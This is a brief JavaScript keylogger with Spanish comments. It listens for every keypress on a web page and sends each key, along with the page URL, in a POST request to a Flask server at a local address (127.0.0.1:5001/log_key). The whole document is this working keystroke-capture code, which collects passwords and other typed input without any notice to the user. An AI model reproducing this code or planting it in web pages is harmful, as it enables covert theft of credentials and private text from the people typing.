document.addEventListener('keydown', function(event) {
    let key = event.key;  // Captura la tecla presionada
    let currentUrl = window.location.href;  // Captura la URL actual
    console.log('Tecla presionada:', key);

    // Envía la tecla y la URL al servidor Flask utilizando POST
    fetch('http://127.0.0.1:5001/log_key', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ key: key, url: currentUrl })  // Enviamos la tecla y la URL como JSON
    })
    .then(response => response.json())
    .then(data => console.log('Respuesta del servidor:', data))
    .catch((error) => console.error('Error:', error));
});

